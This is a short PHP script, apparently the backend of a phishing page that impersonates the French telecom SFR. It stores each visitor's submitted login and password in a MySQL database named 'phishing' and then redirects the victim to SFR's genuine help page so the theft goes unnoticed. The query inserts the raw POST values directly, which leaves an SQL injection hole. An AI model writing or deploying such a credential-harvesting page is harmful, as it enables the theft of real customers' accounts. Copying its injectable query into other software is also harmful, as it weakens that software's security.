<?php


header("refresh:1µ;url=https://assistance.sfr.fr/gestion-client/identifiant-mdp/identifiant-mot-de-passe-espace-client-mail.html#sfrclicid=AS_homepage_identifiants");

$conn=mysqli_connect('localhost','root','','phishing') or die(mysqli_error());
$login = $_POST['login'];
$password = $_POST['password'];

$req="INSERT INTO formulaire (login,password) values ('$login', '$password') ";

$res=mysqli_query($conn,$req);



?>